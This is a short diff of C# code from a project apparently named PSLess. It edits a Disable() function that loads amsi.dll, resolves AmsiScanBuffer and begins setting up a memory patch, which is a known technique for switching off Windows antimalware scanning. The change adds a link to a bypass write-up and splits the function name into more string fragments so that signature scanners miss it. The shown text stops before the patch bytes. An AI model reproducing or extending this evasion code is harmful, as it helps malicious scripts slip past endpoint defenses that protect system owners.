@@ -18,11 +18,12 @@ namespace PSLess
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
         static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+       //https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/
         public static int Disable()
         {
             IntPtr TargetDLL = LoadLibrary("amsi.dll");
             if (TargetDLL == IntPtr.Zero) { return 1; }
-            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Am" +"si"+ "Sc"+"an" + "Buffer");
             if (ASBPtr == IntPtr.Zero) { return 1; }
             UIntPtr dwSize = (UIntPtr)5;
             uint Zero = 0;
